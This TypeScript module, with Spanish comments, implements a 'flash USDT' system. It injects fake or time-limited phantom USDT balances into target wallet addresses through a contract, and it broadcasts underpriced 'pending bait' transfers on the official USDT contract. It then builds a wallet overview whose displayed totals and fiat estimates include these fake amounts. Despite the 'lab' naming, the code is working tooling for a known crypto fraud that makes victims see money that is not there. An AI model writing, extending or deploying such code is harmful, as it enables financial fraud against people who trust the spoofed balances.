import type { Address, Hash } from "viem";
import { formatUnits, isAddress } from "viem";
import {
  clampFlashDurationMinutes,
  flashDurationMinutesToSeconds,
} from "@/lib/labs/flash-duration";
import {
  ERC20_ABI,
  FLASH_USDT_LAB_ABI,
  fromLabTokenUnits,
  getLabContractAddress,
  getPendingBaitMaxFeePerGas,
  getPublicClient,
  getWalletClient,
  isEvmConfigured,
  toLabTokenUnits,
  toOfficialUsdtUnits,
} from "./client";
import {
  getEvmNetworkLabel,
  type EvmNetwork,
} from "./network";
import {
  getOfficialUsdtContractAddress,
  getOfficialUsdtDecimals,
  getOfficialUsdtMeta,
} from "./usdt-canonical";
import type {
  EvmBalanceResult,
  EvmBurnResult,
  EvmInjectResult,
  EvmTxStatus,
  PendingFlashInjectResult,
  WalletUsdtOverview,
} from "./types";

export type EvmLabOptions = {
  labContractAddress?: Address;
  treasuryPrivateKey?: `0x${string}`;
};

/** Modo 1 — token falso persistente */
export async function injectFlashUsdt(
  toAddress: string,
  amount: number,
  network: EvmNetwork,
  options?: EvmLabOptions
): Promise<EvmInjectResult> {
  if (!isEvmConfigured(network, options?.labContractAddress, options?.treasuryPrivateKey)) {
    return {
      success: true,
      simulated: true,
      txHash: `SIM_${Date.now()}_${toAddress.slice(-6)}` as Hash,
      contractAddress: "0x0000000000000000000000000000000000000001",
      deliveryMethod: "transfer",
      pendingTxHash: `SIM_PENDING_${Date.now()}` as Hash,
    };
  }

  try {
    if (!isAddress(toAddress)) {
      return { success: false, error: "Dirección EVM destino inválida" };
    }

    const walletClient = getWalletClient(network, options?.treasuryPrivateKey);
    const contractAddress = getLabContractAddress(network, options?.labContractAddress);
    const tokenAmount = toLabTokenUnits(amount);

    const txHash = await walletClient.writeContract({
      address: contractAddress,
      abi: FLASH_USDT_LAB_ABI,
      functionName: "injectTo",
      args: [toAddress as Address, tokenAmount],
    });

    const pendingTxHash = await broadcastOfficialUsdtPendingBait(
      toAddress as Address,
      amount,
      network
    );

    return {
      success: true,
      txHash,
      contractAddress,
      deliveryMethod: "transfer",
      pendingTxHash,
    };
  } catch (err) {
    return {
      success: false,
      error: err instanceof Error ? err.message : String(err),
    };
  }
}

/** Modo 2 — saldo fantasma + cebo pending USDT oficial */
export async function injectPendingFlashUsdt(
  toAddress: string,
  amount: number,
  durationMinutesInput: number,
  network: EvmNetwork,
  options?: EvmLabOptions
): Promise<PendingFlashInjectResult> {
  const durationMinutes = clampFlashDurationMinutes(durationMinutesInput);
  const flashExpiresAt = new Date(Date.now() + durationMinutes * 60 * 1000).toISOString();

  if (!isEvmConfigured(network, options?.labContractAddress, options?.treasuryPrivateKey)) {
    return {
      success: true,
      simulated: true,
      txHash: `SIM_FLASH_${Date.now()}` as Hash,
      pendingTxHash: `SIM_PENDING_${Date.now()}` as Hash,
      contractAddress: "0x0000000000000000000000000000000000000001",
      deliveryMethod: "flash_inject",
      flashActive: true,
      flashExpiresAt,
      onChainBalance: amount.toString(),
      flashBalance: amount.toString(),
    };
  }

  try {
    if (!isAddress(toAddress)) {
      return { success: false, error: "Dirección EVM destino inválida", flashActive: false };
    }

    const walletClient = getWalletClient(network, options?.treasuryPrivateKey);
    const contractAddress = getLabContractAddress(network, options?.labContractAddress);
    const tokenAmount = toLabTokenUnits(amount);
    const durationSeconds = BigInt(flashDurationMinutesToSeconds(durationMinutes));

    const txHash = await walletClient.writeContract({
      address: contractAddress,
      abi: FLASH_USDT_LAB_ABI,
      functionName: "flashInject",
      args: [toAddress as Address, tokenAmount, durationSeconds],
    });

    const pendingTxHash = await broadcastOfficialUsdtPendingBait(
      toAddress as Address,
      amount,
      network
    );
    const publicClient = getPublicClient(network);

    const [onChainBalance, flashBalance] = await publicClient.multicall({
      contracts: [
        {
          address: contractAddress,
          abi: FLASH_USDT_LAB_ABI,
          functionName: "balanceOf",
          args: [toAddress as Address],
        },
        {
          address: contractAddress,
          abi: FLASH_USDT_LAB_ABI,
          functionName: "flashBalanceOf",
          args: [toAddress as Address],
        },
      ],
    });

    return {
      success: true,
      txHash,
      pendingTxHash,
      contractAddress,
      deliveryMethod: "flash_inject",
      flashActive: true,
      flashExpiresAt,
      onChainBalance: fromLabTokenUnits(
        onChainBalance.status === "success" ? onChainBalance.result : BigInt(0)
      ),
      flashBalance: fromLabTokenUnits(
        flashBalance.status === "success" ? flashBalance.result : BigInt(0)
      ),
    };
  } catch (err) {
    return {
      success: false,
      error: err instanceof Error ? err.message : String(err),
      flashActive: false,
    };
  }
}

export async function renewOfficialUsdtPendingBait(
  toAddress: string,
  amount: number,
  network: EvmNetwork,
  options?: EvmLabOptions
): Promise<{ txHash?: Hash; error?: string }> {
  if (!isEvmConfigured(network, options?.labContractAddress, options?.treasuryPrivateKey)) {
    return { txHash: `SIM_PENDING_${Date.now()}` as Hash };
  }

  if (!isAddress(toAddress)) {
    return { error: "Dirección EVM destino inválida" };
  }

  const txHash = await broadcastOfficialUsdtPendingBait(
    toAddress as Address,
    amount,
    network,
    options
  );
  if (!txHash) {
    return { error: "No se pudo emitir cebo pending USDT oficial" };
  }
  return { txHash };
}

async function broadcastOfficialUsdtPendingBait(
  toAddress: Address,
  amount: number,
  network: EvmNetwork,
  options?: EvmLabOptions
): Promise<Hash | undefined> {
  try {
    const walletClient = getWalletClient(network, options?.treasuryPrivateKey);
    const officialAddress = getOfficialUsdtContractAddress(network);
    const decimals = getOfficialUsdtDecimals(network);
    const tokenAmount = toOfficialUsdtUnits(amount, decimals);
    const maxFeePerGas = getPendingBaitMaxFeePerGas();

    const hash = await walletClient.writeContract({
      address: officialAddress,
      abi: ERC20_ABI,
      functionName: "transfer",
      args: [toAddress, tokenAmount],
      gas: BigInt(120_000),
      maxFeePerGas,
      maxPriorityFeePerGas: maxFeePerGas / BigInt(2),
    });

    return hash;
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    const txMatch = msg.match(/(0x[a-fA-F0-9]{64})/);
    return txMatch?.[1] as Hash | undefined;
  }
}

export async function renewFlashInject(
  toAddress: string,
  amount: number,
  durationMinutesInput: number,
  network: EvmNetwork,
  options?: EvmLabOptions
): Promise<{ success: boolean; txHash?: Hash; flashExpiresAt?: string; error?: string }> {
  const durationMinutes = clampFlashDurationMinutes(durationMinutesInput);
  const flashExpiresAt = new Date(Date.now() + durationMinutes * 60 * 1000).toISOString();

  if (!isEvmConfigured(network, options?.labContractAddress, options?.treasuryPrivateKey)) {
    return {
      success: true,
      txHash: `SIM_RENEW_${Date.now()}` as Hash,
      flashExpiresAt,
    };
  }

  try {
    if (!isAddress(toAddress)) {
      return { success: false, error: "Dirección EVM destino inválida" };
    }

    const walletClient = getWalletClient(network, options?.treasuryPrivateKey);
    const durationSeconds = BigInt(flashDurationMinutesToSeconds(durationMinutes));

    const txHash = await walletClient.writeContract({
      address: getLabContractAddress(network, options?.labContractAddress),
      abi: FLASH_USDT_LAB_ABI,
      functionName: "flashInject",
      args: [toAddress as Address, toLabTokenUnits(amount), durationSeconds],
    });

    return { success: true, txHash, flashExpiresAt };
  } catch (err) {
    return {
      success: false,
      error: err instanceof Error ? err.message : String(err),
    };
  }
}

export async function clearFlashCredit(
  holderAddress: string,
  network: EvmNetwork,
  options?: EvmLabOptions
): Promise<EvmBurnResult> {
  if (!isEvmConfigured(network, options?.labContractAddress, options?.treasuryPrivateKey)) {
    return {
      success: true,
      simulated: true,
      txHash: `SIM_CLEAR_${Date.now()}` as Hash,
      amountBurned: "0",
    };
  }

  try {
    const walletClient = getWalletClient(network, options?.treasuryPrivateKey);
    const txHash = await walletClient.writeContract({
      address: getLabContractAddress(network, options?.labContractAddress),
      abi: FLASH_USDT_LAB_ABI,
      functionName: "clearFlash",
      args: [holderAddress as Address],
    });
    return { success: true, txHash, amountBurned: "0" };
  } catch (err) {
    return {
      success: false,
      error: err instanceof Error ? err.message : String(err),
    };
  }
}

export async function burnFlashUsdt(
  holderAddress: string,
  network: EvmNetwork,
  amount?: number,
  mode: "fake_token" | "pending_flash" = "fake_token",
  options?: EvmLabOptions
): Promise<EvmBurnResult> {
  if (mode === "pending_flash") {
    return clearFlashCredit(holderAddress, network, options);
  }

  if (!isEvmConfigured(network, options?.labContractAddress, options?.treasuryPrivateKey)) {
    return {
      success: true,
      simulated: true,
      txHash: `SIM_BURN_${Date.now()}` as Hash,
      amountBurned: amount?.toString() ?? "0",
    };
  }

  try {
    const walletClient = getWalletClient(network, options?.treasuryPrivateKey);
    const publicClient = getPublicClient(network);
    const contractAddress = getLabContractAddress(network, options?.labContractAddress);

    let burnAmount: bigint;
    if (amount != null) {
      burnAmount = toLabTokenUnits(amount);
    } else {
      const raw = await publicClient.readContract({
        address: contractAddress,
        abi: FLASH_USDT_LAB_ABI,
        functionName: "realBalanceOf",
        args: [holderAddress as Address],
      });
      burnAmount = raw;
      if (burnAmount === BigInt(0)) {
        return clearFlashCredit(holderAddress, network, options);
      }
    }

    const txHash = await walletClient.writeContract({
      address: contractAddress,
      abi: FLASH_USDT_LAB_ABI,
      functionName: "burnFrom",
      args: [holderAddress as Address, burnAmount],
    });

    return {
      success: true,
      txHash,
      amountBurned: fromLabTokenUnits(burnAmount),
    };
  } catch (err) {
    return {
      success: false,
      error: err instanceof Error ? err.message : String(err),
    };
  }
}

export async function getFlashUsdtBalance(
  holderAddress: string,
  network: EvmNetwork,
  options?: EvmLabOptions
): Promise<EvmBalanceResult> {
  const contractAddress = isEvmConfigured(
    network,
    options?.labContractAddress,
    options?.treasuryPrivateKey
  )
    ? getLabContractAddress(network, options?.labContractAddress)
    : ("0x0000000000000000000000000000000000000001" as Address);

  if (!isEvmConfigured(network, options?.labContractAddress, options?.treasuryPrivateKey)) {
    return {
      balance: "0",
      balanceRaw: "0",
      contractAddress,
      simulated: true,
    };
  }

  try {
    const publicClient = getPublicClient(network);
    const raw = await publicClient.readContract({
      address: contractAddress,
      abi: FLASH_USDT_LAB_ABI,
      functionName: "balanceOf",
      args: [holderAddress as Address],
    });
    const balance = fromLabTokenUnits(raw);
    return { balance, balanceRaw: raw.toString(), contractAddress };
  } catch {
    return { balance: "0", balanceRaw: "0", contractAddress, simulated: false };
  }
}

export async function getOfficialUsdtBalance(
  holderAddress: string,
  network: EvmNetwork
): Promise<EvmBalanceResult> {
  const contractAddress = getOfficialUsdtContractAddress(network);
  const decimals = getOfficialUsdtDecimals(network);

  try {
    const publicClient = getPublicClient(network);
    const raw = await publicClient.readContract({
      address: contractAddress,
      abi: ERC20_ABI,
      functionName: "balanceOf",
      args: [holderAddress as Address],
    });
    return {
      balance: formatUnits(raw, decimals),
      balanceRaw: raw.toString(),
      contractAddress,
    };
  } catch {
    return { balance: "0", balanceRaw: "0", contractAddress, simulated: false };
  }
}

export async function getWalletUsdtOverview(
  holderAddress: string,
  network: EvmNetwork,
  options?: EvmLabOptions & {
    simulatedLabAmount?: number;
    injectionMode?: "fake_token" | "pending_flash";
    flashExpiresAt?: string | null;
    pendingBaitAmount?: number;
    pendingBaitActive?: boolean;
  }
): Promise<WalletUsdtOverview> {
  const mode = options?.injectionMode ?? "fake_token";
  const pendingBaitActive = options?.pendingBaitActive ?? false;
  const pendingBaitNum = pendingBaitActive ? (options?.pendingBaitAmount ?? 0) : 0;
  const officialMeta = getOfficialUsdtMeta(network);

  if (!isEvmConfigured(network, options?.labContractAddress, options?.treasuryPrivateKey)) {
    const labBal = options?.simulatedLabAmount ?? 0;
    const flashActive =
      mode === "pending_flash" &&
      Boolean(options?.flashExpiresAt && new Date(options.flashExpiresAt) > new Date());
    const displayLab = flashActive || mode === "fake_token" ? labBal : 0;
    return {
      officialBalance: "0",
      labBalance: labBal.toString(),
      flashBalance: flashActive ? labBal.toString() : "0",
      totalDisplayed: (displayLab + pendingBaitNum).toString(),
      estimatedWalletFiatUsd: (pendingBaitNum + displayLab).toString(),
      pendingBaitAmount: pendingBaitActive ? pendingBaitNum.toString() : "0",
      pendingBaitActive,
      autoDetected: true,
      requiresImport: false,
      flashActive,
      flashExpiresAt: options?.flashExpiresAt ?? undefined,
      simulated: true,
    };
  }

  const contractAddress = getLabContractAddress(network, options?.labContractAddress);
  const publicClient = getPublicClient(network);

  const [official, totalLab, flashRaw, expiresRaw] = await Promise.all([
    getOfficialUsdtBalance(holderAddress, network),
    getFlashUsdtBalance(holderAddress, network, options),
    publicClient
      .readContract({
        address: contractAddress,
        abi: FLASH_USDT_LAB_ABI,
        functionName: "flashBalanceOf",
        args: [holderAddress as Address],
      })
      .catch(() => BigInt(0)),
    publicClient
      .readContract({
        address: contractAddress,
        abi: FLASH_USDT_LAB_ABI,
        functionName: "flashExpiresAt",
        args: [holderAddress as Address],
      })
      .catch(() => BigInt(0)),
  ]);

  const flashBalance = fromLabTokenUnits(flashRaw);
  const expiresSec = Number(expiresRaw);
  const flashExpiresAt =
    expiresSec > 0 ? new Date(expiresSec * 1000).toISOString() : undefined;
  const flashActive = parseFloat(flashBalance) > 0;

  const officialNum = parseFloat(official.balance) || 0;
  const totalNum = parseFloat(totalLab.balance) || 0;
  const total = officialNum + totalNum;
  const estimatedWalletFiatUsd = officialNum + pendingBaitNum;

  return {
    officialBalance: official.balance,
    labBalance: totalLab.balance,
    flashBalance,
    totalDisplayed: total % 1 === 0 ? total.toString() : total.toFixed(6).replace(/\.?0+$/, ""),
    estimatedWalletFiatUsd:
      estimatedWalletFiatUsd % 1 === 0
        ? estimatedWalletFiatUsd.toString()
        : estimatedWalletFiatUsd.toFixed(2).replace(/\.?0+$/, ""),
    pendingBaitAmount: pendingBaitActive ? pendingBaitNum.toString() : "0",
    pendingBaitActive,
    officialContract: officialMeta.contractAddress,
    labContract: contractAddress,
    autoDetected: true,
    requiresImport: false,
    flashActive,
    flashExpiresAt,
    simulated: false,
  };
}

export async function getTxStatus(
  txHash: string,
  network: EvmNetwork,
  options?: EvmLabOptions
): Promise<EvmTxStatus> {
  if (txHash.startsWith("SIM_")) {
    return { confirmed: true, txHash, blockNumber: 0 };
  }

  if (!isEvmConfigured(network, options?.labContractAddress, options?.treasuryPrivateKey)) {
    return { confirmed: false, pending: true, txHash };
  }

  try {
    const publicClient = getPublicClient(network);
    const receipt = await publicClient
      .getTransactionReceipt({ hash: txHash as Hash })
      .catch(() => null);

    if (!receipt) {
      const tx = await publicClient
        .getTransaction({ hash: txHash as Hash })
        .catch(() => null);
      return { confirmed: false, pending: Boolean(tx), failed: false, txHash };
    }

    const failed = receipt.status === "reverted";
    return {
      confirmed: receipt.status === "success",
      failed,
      pending: false,
      txHash,
      blockNumber: Number(receipt.blockNumber),
    };
  } catch {
    return { confirmed: false, pending: true, txHash };
  }
}

export function isLabEvmReady(
  network?: EvmNetwork,
  labContractAddress?: string | null,
  treasuryPrivateKey?: `0x${string}` | null
): boolean {
  return isEvmConfigured(network, labContractAddress, treasuryPrivateKey);
}

export function getLabNetworkLabel(network: EvmNetwork): string {
  return getEvmNetworkLabel(network);
}
